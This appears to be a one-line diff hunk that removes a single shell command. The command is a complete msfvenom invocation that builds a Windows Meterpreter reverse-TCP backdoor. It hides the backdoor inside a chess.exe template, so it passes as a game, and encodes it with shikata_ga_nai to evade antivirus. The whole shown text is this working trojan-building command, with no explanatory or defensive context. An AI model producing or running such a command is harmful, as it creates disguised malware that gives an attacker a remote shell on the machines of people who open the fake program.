@@ -1,1 +1,0 @@
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=2018 -x /usr/share/chess.exe -e x86/shikata_ga_nai -i 2 -f exe > chess.exe
